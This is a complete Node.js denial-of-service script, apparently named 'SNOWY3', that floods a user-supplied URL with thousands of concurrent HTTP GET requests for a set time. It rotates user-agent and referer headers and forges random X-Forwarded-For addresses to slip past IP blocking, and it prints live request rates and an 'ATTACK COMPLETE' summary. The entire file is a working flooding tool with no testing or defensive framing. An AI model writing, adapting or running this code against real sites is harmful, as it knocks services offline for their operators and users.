const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const process = require('process');
const pLimit = require('p-limit').default;

const TARGET = process.argv[2];
const DURATION = parseInt(process.argv[3]) * 1000;

if (!TARGET || isNaN(DURATION)) {
    console.log('Usage: node attack.js <url> <timeSec>');
    process.exit(1);
}

const USER_AGENTS = loadLines('ua.txt');
const REFERERS = loadLines('refs.txt');

const MAX_CONCURRENT = 2000;
const BOOST_THREADS = 32;
const REQUEST_TIMEOUT = 10000;

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: Infinity });

function loadLines(file) {
    try {
        return fs.readFileSync(file, 'utf8')
            .split('\n')
            .map(l => l.trim())
            .filter(Boolean);
    } catch {
        return [];
    }
}

function randItem(arr, fallback = '') {
    return arr[Math.floor(Math.random() * arr.length)] || fallback;
}

function randIp() {
    return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

class AttackEngine {
    constructor() {
        this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
        this.limit = pLimit(MAX_CONCURRENT);
        this.startTime = Date.now();
        this.effects = ['💣', '⚡', '🔥', '💥', '🚀'];
        this.fxIndex = 0;
    }

    async makeRequest() {
        const headers = {
            'User-Agent': randItem(USER_AGENTS, 'Mozilla/5.0'),
            'Referer': randItem(REFERERS, 'https://google.com'),
            'X-Forwarded-For': randIp()
        };

        try {
            await axios.get(TARGET, {
                headers,
                timeout: REQUEST_TIMEOUT,
                httpAgent,
                httpsAgent,
                maxRedirects: 0,
                validateStatus: null
            });
            return 'SUCCESS';
        } catch {
            return 'ERROR';
        }
    }

    displayStats() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const rps = (this.stats.total / elapsed).toFixed(1);
        this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
        const fx = this.effects[this.fxIndex++ % this.effects.length];
        process.stdout.write(
            `\r${fx} RPS: ${rps} | HITS: ${this.stats.success} | ERRORS: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`
        );
    }

    async runLoop() {
        const batch = Array.from({ length: MAX_CONCURRENT }, () =>
            this.limit(() => this.makeRequest())
        );
        const results = await Promise.allSettled(batch);
        results.forEach(res => {
            this.stats.total++;
            if (res.status === 'fulfilled' && res.value === 'SUCCESS') {
                this.stats.success++;
            } else {
                this.stats.errors++;
            }
        });
    }

    async runBoostLoop() {
        while (Date.now() - this.startTime < DURATION) {
            await this.makeRequest();
        }
    }

    async runAttack() {
        const statInterval = setInterval(() => this.displayStats(), 100);

        const boosters = [];
        for (let i = 0; i < BOOST_THREADS; i++) {
            boosters.push(this.runBoostLoop());
        }

        while (Date.now() - this.startTime < DURATION) {
            await this.runLoop();
        }

        clearInterval(statInterval);
        process.stdout.write('\n');
        await Promise.allSettled(boosters);
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = (this.stats.total / elapsed).toFixed(1);
        console.log('\n\nATTACK COMPLETE');
        console.log('='.repeat(60));
        console.log(`TARGET: ${TARGET}`);
        console.log(`TIME: ${elapsed.toFixed(1)}s`);
        console.log(`TOTAL: ${this.stats.total}`);
        console.log(`SUCCESS: ${this.stats.success}`);
        console.log(`ERRORS: ${this.stats.errors}`);
        console.log(`AVG RPS: ${avgRps}`);
        console.log(`PEAK RPS: ${this.stats.peakRps.toFixed(1)}`);
        console.log('='.repeat(60));
    }
}

// MAIN
(async () => {
    console.log('\nSNOWY3 - MADMODE ACTIVE');
    console.log('='.repeat(60));
    const engine = new AttackEngine();
    await engine.runAttack();
})();
